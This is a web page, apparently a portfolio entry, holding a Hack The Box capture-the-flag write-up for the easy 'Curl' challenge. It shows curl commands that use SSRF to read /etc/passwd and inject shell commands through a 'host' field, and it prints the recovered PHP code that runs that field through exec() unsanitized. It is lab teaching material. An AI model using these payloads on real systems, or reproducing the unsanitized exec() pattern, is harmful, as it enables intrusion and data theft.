@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Curl — HTB Writeup · Arthur Trapp</title>
+<meta name="description" content="SSRF + OS command injection via /api/curl" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%232c3b4d'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' fill='%23f79c42' text-anchor='middle'%3E$%3C/text%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+<header>
+  <div class="wrap nav">
+    <a class="nav-brand" href="../index.html"><span class="logo">AT</span>arthur_trapp</a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#projects">projects</a>
+      <a class="active" href="index.html">writeups</a>
+      <a href="../index.html#contact">contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="page-hero">
+    <div class="wrap">
+      <div class="crumb"><a href="../index.html">~</a> / <a href="index.html">writeups</a> / curl</div>
+      <h1>Curl</h1>
+      <p class="sub">Hack The Box · <span class="accent">Easy</span> · Web</p>
+      <div class="meta-tags">
+        <span class="green">Easy</span>
+        <span>Web</span>
+        <span class="accent">Challenge</span>
+      </div>
+    </div>
+  </div>
+  <article class="content wrap">
+<h2>Machine Overview</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>Curl (Health Checker v1.0)</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Debian 12 (bookworm) container, Talos K8s pod</td>
+</tr>
+<tr>
+<td>IP</td>
+<td>154.57.164.69:36904</td>
+</tr>
+<tr>
+<td>App</td>
+<td>PHP + nginx, custom MVC (<code>Router</code>/<code>CurlController</code>/<code>CommandModel</code>)</td>
+</tr>
+<tr>
+<td>Kernel</td>
+<td>6.18.24-talos</td>
+</tr>
+<tr>
+<td>Ports</td>
+<td>36904 (nginx HTTP)</td>
+</tr>
+</tbody>
+</table></div>
+<h2>Flags</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Level</th>
+<th>Path</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Flag</td>
+<td><code>/flag</code></td>
+<td><code>[REDACTED]</code></td>
+</tr>
+</tbody>
+</table></div>
+<h2>Reconnaissance</h2>
+<pre><code class="language-bash">curl -s -i http://154.57.164.69:36904/
+# 200 OK, &quot;Health Checker v1.0&quot;, form with host= field
+</code></pre>
+<pre><code class="language-bash">curl -s http://154.57.164.69:36904/static/js/main.js
+# fetch('/api/curl', { method:'POST', body:`host=${encodeURIComponent(host.value)}` ...})
+</code></pre>
+<h2>Attack Chain</h2>
+<h3>1. Locate the real endpoint</h3>
+<p><code>main.js</code> reveals the frontend posts to <code>/api/curl</code> (POST, form-encoded). POSTing to <code>/</code> returns <code>405 Method Not Allowed</code>.</p>
+<h3>2. Confirm SSRF via <code>file://</code></h3>
+<pre><code class="language-bash">curl -s -X POST http://154.57.164.69:36904/api/curl --data 'host=file:///etc/passwd'
+# {&quot;message&quot;:&quot;root:x:0:0:root:/root:/bin/bash\n...\nwww:x:1000:1000::/home/www:/bin/sh\n...&quot;}
+</code></pre>
+<h3>3. Command injection (the core vuln)</h3>
+<p>The <code>host</code> field is interpolated into <code>curl -sL $host 2&gt;&amp;1</code> and run through PHP <code>exec()</code> with no sanitization.</p>
+<pre><code class="language-bash">curl -s -X POST http://154.57.164.69:36904/api/curl --data 'host=http://localhost/;id'
+# ...uid=1000(www) gid=1000(www) groups=1000(www)
+</code></pre>
+<h3>4. Enumerate + read the flag</h3>
+<pre><code class="language-bash"># ls -la /  →  -rw-r--r--  1 root root 78  /flag
+cat /flag
+# [REDACTED]
+</code></pre>
+<h2>Vulnerable Source (recovered from the box)</h2>
+<pre><code class="language-php">// controllers/CurlController.php
+public function execute($router) {
+    $host = (isset($_POST['host'])) ? $_POST['host'] : 'http://127.0.0.1/';
+    $curl = new CommandModel($host);
+    return json_encode([ 'message' =&gt; $curl-&gt;exec() ]);
+}
+
+// models/CommandModel.php
+class CommandModel {
+    public function __construct($host) {
+        $this-&gt;command = &quot;curl -sL $host 2&gt;&amp;1&quot;;   // ← unsanitized
+    }
+    public function exec() {
+        exec($this-&gt;command, $output);
+        return is_array($output) ? implode(&quot;\n&quot;, $output) : $output;
+    }
+}
+</code></pre>
+<h2>Techniques Demonstrated</h2>
+<ol>
+<li>JS source review to discover the API endpoint</li>
+<li>SSRF via <code>file://</code> scheme</li>
+<li>OS command injection (<code>;</code> metacharacter) through <code>exec()</code></li>
+<li>Filesystem enumeration to locate the world-readable <code>/flag</code></li>
+</ol>
+<h2>Tools Used</h2>
+<p>curl, Python (urllib helper), PHP source review.</p>
+    <a class="back-link" href="index.html">← all writeups</a>
+  </article>
+</main>
+<footer>
+  <div class="wrap footer-row">
+    <span>© 2026 Arthur Trapp · Rochester, NY</span>
+    <span class="clearance">ACTIVE TS/SCI CLEARANCE</span>
+  </div>
+</footer>
+<script>
+  const io = new IntersectionObserver((es) => {
+    es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.content h2, .content h3, .content p, .content pre, .content table, .content ul, .content ol, .content blockquote').forEach(el => io.observe(el));
+</script>
+</body>
+</html>
